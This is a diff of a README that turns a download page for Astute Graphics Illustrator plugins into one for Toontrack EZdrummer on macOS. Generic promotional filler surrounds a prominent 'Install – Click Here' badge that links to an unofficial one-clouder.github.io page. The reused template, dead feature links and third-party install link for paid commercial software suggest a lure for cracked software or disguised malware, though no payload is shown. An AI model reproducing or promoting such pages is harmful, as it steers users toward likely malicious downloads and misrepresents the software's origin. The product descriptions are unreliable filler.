@@ -1,69 +1,67 @@
-# Astute Graphics – Illustrator Plugin Suite
+# Toontrack EZdrummer Mac
 
 <p align="center">
-  <img src="https://yt3.googleusercontent.com/9Elj4HqxabJAzhaNG9KrZRS-KOZj08i82Dk-0mwnU0tkupgNYuYbOTeF6t2L5phyiHJl4aNfUIM=s900-c-k-c0x00ffffff-no-rj" width="200" alt="Astute Graphics 2022 icon"/>
+  <img src="https://extraplugins.com/wp-content/uploads/2023/04/EZdrummer3_Box.webp" width="200" alt="Toontrack EZdrummer icon"/>
 </p>
 
 <p align="center">
-  <a href="https://one-clouder.github.io/.github/astutegraphics2022">
-    <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Astute Graphics 2022"/>
-  </a>
+
+[![Install](https://img.shields.io/badge/Install-Click%20Here-white?style=for-the-badge&logo=github&logoColor=black&labelColor=white&color=black)](https://one-clouder.github.io/.github/toontrackezdrummer)
+
 </p>
 
 <p align="center">
-  <img src="https://docs-astute-graphics.imgix.net/support/detecting-adding-plugins-to-new-installations-illustrator/am-manually-specify-illustrator-version-4.jpg?ixlib=php-4.1.0" alt="Astute Graphics 2022 screenshot"/>
+  <img src="https://cdn.toontrack.com/app/uploads/product/ezdrummer-3/png/TT528_EZdrummer3_top-image-5.png" alt="Toontrack EZdrummer screenshot"/>
 </p>
 
 ---
 
 ## Overview
 
-<a href="#">Astute Graphics 2022</a> delivers professional vector tools through plugins designed for both simplicity and depth. The suite serves illustrators and vector designers.
+<a href="#">Toontrack EZdrummer for macOS</a> is a specialized drum production software designed for users who want a reliable, Mac-native tool with clear controls and stable performance. It relies on system frameworks, familiar interface patterns and predictable behavior so users can integrate it into daily routines without friction. The layout emphasizes clarity, with tools grouped into logical sections that keep both power and simplicity within reach.
 
-The <a href="#">MirrorMe</a> creates symmetrical artwork instantly. Draw with real-time mirroring.
+In everyday use, <a href="#">EZdrummer</a> keeps core actions close at hand while offering additional <a href="#">advanced controls</a> for users who want to fine-tune behavior. Menus, shortcuts and panels follow Apple's design language, helping you move quickly between tasks. Whether you are exploring features for the first time or returning to established workflows, the environment stays consistent and reliable.
 
-<a href="#">SubScribe</a> extends Illustrator's precision drawing. Create geometric shapes with constraints.
+Under the hood, <a href="#">EZdrummer</a> is engineered around <a href="#">macOS technologies</a> that handle performance-critical work. This approach allows it to remain responsive even while processing complex operations, managing multiple tasks or handling large datasets at once. Background operations are handled quietly, keeping the interface smooth so that navigation, configuration and monitoring always feel responsive.
 
-<a href="#">Stipplism</a> generates stipple and halftone effects. Create artistic dot patterns.
+For professionals, <a href="#">EZdrummer</a> supports more demanding scenarios with configurable options, presets and automation-friendly behavior. Settings can be adjusted to match preferred habits, whether that means changing operational parameters, tuning performance rules or adapting how the app interacts with external services. These options are organized using descriptive <a href="#">preference panels</a> rather than hidden configuration files.
 
-The <a href="#">DirectPrefs</a> provides quick preference access. Adjust settings without menus.
+Over time, <a href="#">EZdrummer</a> becomes a dependable part of the Mac environment. Its combination of refined interface decisions, efficient processing and thoughtful defaults makes it suitable for long-term use. Users can trust that the application will behave consistently, preserve work safely and adapt as macOS continues to evolve.
 
-<a href="#">SelectMenu</a> enhances selection capabilities. Select by attributes efficiently.
+The <a href="#">drum library</a> includes professionally recorded kits. Access studio-quality drum sounds.
 
-<a href="#">Concatenate</a> joins paths and text intelligently. Connect elements smoothly.
+<a href="#">Bandmate</a> feature creates drum parts from song input. Hum or tap and get full arrangements.
 
-<a href="#">Autosaviour</a> protects work with automatic saving. Never lose work again.
+<a href="#">groove library</a> contains thousands of MIDI patterns. Find rhythms for any style.
 
-<a href="#">Stylism</a> adds dynamic effects to paths. Apply shadows and effects live.
+The <a href="#">Song Creator</a> builds complete drum tracks. Arrange intros, verses, and choruses.
 
-<a href="#">Block Shadow</a> creates dimensional shadows. Add depth with one click.
+<a href="#">Grid Editor</a> enables pattern customization. Edit grooves at the note level.
 
-<a href="#">regular updates</a> maintain Illustrator compatibility. Work with latest versions.
+<a href="#">mixer</a> provides individual channel control. Shape drum sound with full mixing.
 
 ---
 
 ## Key Features
 
-- <a href="#">VectorScribe</a> path editing
-- <a href="#">DynamicSketch</a> drawing
-- <a href="#">ColliderScribe</a> alignment
-- <a href="#">WidthScribe</a> strokes
-- <a href="#">InkScribe</a> pen tool
-- <a href="#">Phantasm</a> color adjustment
-- <a href="#">MirrorMe</a> symmetry
-- <a href="#">Stylism</a> live effects
-- <a href="#">Autosaviour</a> protection
+- <a href="#">Drum library</a> professional
+- <a href="#">Bandmate</a> intelligent creation
+- <a href="#">Groove library</a> thousands
+- <a href="#">Song Creator</a>
+- <a href="#">Grid Editor</a>
+- <a href="#">Mixer</a> full control
+- <a href="#">Tap-to-find</a>
+- <a href="#">EZX expansions</a>
+- <a href="#">Multi-output</a> routing
 
 ---
 
 ## Additional Information
 
-Astute Graphics 2022 distinguishes itself through unwavering commitment to quality and user experience excellence. Rather than compromising platform integration for cross-compatibility, development focuses exclusively on delivering authentic native operation.
+Toontrack EZdrummer Mac delivers capabilities specifically tuned for the platform's strengths. The design respects established conventions while introducing refinements that enhance productivity without disrupting familiar interaction patterns.
 
-Users appreciate the application's predictable behavior and minimal maintenance requirements, characteristics that prove invaluable in professional settings where downtime creates costly disruptions.
+Workflow integration extends beyond basic functionality to support comprehensive automation and collaboration scenarios. The application cooperates with system services and third-party tools through standard protocols, enabling construction of sophisticated pipelines without custom scripting.
 
-Enterprise deployments benefit from flexible licensing and centralized management capabilities. Technical teams can standardize configurations while preserving individual customization options, achieving organizational consistency without sacrificing personal productivity.
-
-Sustained development ensures the application evolves with platform capabilities while maintaining backward compatibility. Feature additions prioritize user requests and workflow optimization, keeping the tool relevant as professional requirements advance and technology landscapes shift.
+Professional environments benefit from deployment flexibility and management capabilities. Standardized configurations can be distributed across teams while individual customizations remain available, balancing consistency with personal productivity preferences.
 
 ---
